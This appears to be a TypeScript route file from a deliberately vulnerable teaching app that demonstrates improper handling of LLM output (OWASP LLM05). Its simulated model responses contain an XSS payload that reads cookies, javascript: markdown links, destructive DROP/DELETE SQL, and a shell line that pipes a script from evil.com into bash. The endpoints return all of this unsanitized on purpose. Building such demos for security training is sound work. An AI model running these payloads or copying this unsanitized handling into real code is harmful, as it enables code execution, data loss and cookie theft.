import express from 'express';
import { streamResponse } from '../utils/stream';

const router = express.Router();

// VULNERABILITY LLM05: Improper Output Handling
// Simulates an LLM whose output is rendered without sanitization

function simulateLLMOutput(prompt: string): { text: string; rawHtml?: string; sqlQuery?: string } {
  const lower = prompt.toLowerCase();

  // VULNERABILITY: LLM generates HTML/JS that gets rendered unsanitized (XSS)
  if (lower.includes('greeting card') || lower.includes('html') || lower.includes('webpage')) {
    return {
      text: 'Here\'s a greeting card I generated for you!',
      rawHtml: `<div style="padding:20px; background:linear-gradient(135deg,#667eea,#764ba2); color:white; border-radius:10px; text-align:center;">
  <h2>Happy Birthday!</h2>
  <p>Wishing you all the best!</p>
  <img src="x" onerror="document.getElementById('xss-demo').innerHTML='<h3 style=color:red>XSS EXECUTED! Cookie: '+document.cookie+'</h3>'">
  <script>console.log('XSS: Script executed from LLM output!')</script>
</div>`,
    };
  }

  // VULNERABILITY: LLM generates SQL that gets executed directly
  if (lower.includes('delete') || lower.includes('drop') || lower.includes('sql')) {
    return {
      text: 'I\'ve generated the SQL query you requested.',
      sqlQuery: lower.includes('delete')
        ? 'DELETE FROM users WHERE id > 0; -- LLM hallucinated a broader deletion than intended'
        : 'SELECT * FROM users; DROP TABLE sessions; -- LLM injected additional destructive SQL',
    };
  }

  // VULNERABILITY: LLM output contains markdown with embedded JS
  if (lower.includes('markdown') || lower.includes('document') || lower.includes('format')) {
    return {
      text: `# Generated Document\n\nHere's your formatted document:\n\n` +
        `## Section 1\nThis is normal content.\n\n` +
        `## Section 2\n[Click here for more info](javascript:alert('XSS via markdown link!'))\n\n` +
        `![image](x" onerror="alert('XSS via image tag'))\n\n` +
        `This demonstrates how LLM-generated markdown can contain malicious payloads.`,
    };
  }

  // VULNERABILITY: LLM generates shell commands
  if (lower.includes('command') || lower.includes('terminal') || lower.includes('shell')) {
    return {
      text: `Here's the command to clean up temp files:\n\n` +
        `\`rm -rf /tmp/cache && curl http://evil.com/steal.sh | bash\`\n\n` +
        `The LLM appended a malicious command that downloads and executes a script. ` +
        `If the output is piped to a shell without review, it leads to code execution.`,
    };
  }

  return {
    text: `I'm an AI assistant that generates various types of content. Try asking me to:\n` +
      `- Generate a greeting card (HTML output)\n` +
      `- Write a SQL query to delete records\n` +
      `- Create a formatted markdown document\n` +
      `- Suggest a terminal command`,
  };
}

// Chat endpoint with streaming
router.post('/chat', async (req, res) => {
  const { message } = req.body;

  if (!message) {
    return res.status(400).json({ error: 'Message is required' });
  }

  const output = simulateLLMOutput(message);
  await streamResponse(res, output.text);
});

// Generate endpoint - returns raw output for rendering
router.post('/generate', (req, res) => {
  const { prompt } = req.body;

  if (!prompt) {
    return res.status(400).json({ error: 'Prompt is required' });
  }

  const output = simulateLLMOutput(prompt);

  // VULNERABILITY: Returns raw, unsanitized LLM output
  res.json({
    vulnerability: 'LLM05 - Improper Output Handling',
    description: 'LLM output rendered without sanitization can lead to XSS, SQL injection, and command execution',
    prompt: prompt,
    generatedText: output.text,
    rawHtml: output.rawHtml || null,
    sqlQuery: output.sqlQuery || null,
    warning: 'This output would be dangerous if rendered/executed without sanitization',
  });
});

// Info endpoint
router.get('/info', (req, res) => {
  res.json({
    vulnerability: 'LLM05 - Improper Output Handling',
    description: 'LLM outputs are trusted and rendered/executed without validation, enabling XSS, SQL injection, and RCE',
    attackExamples: [
      'Generate a greeting card (contains XSS payload in HTML)',
      'Write a SQL query to delete inactive users (hallucinates broader deletion)',
      'Create a markdown document (contains javascript: links)',
      'Suggest a command to clean up files (appends malicious command)',
    ],
  });
});

export default router;
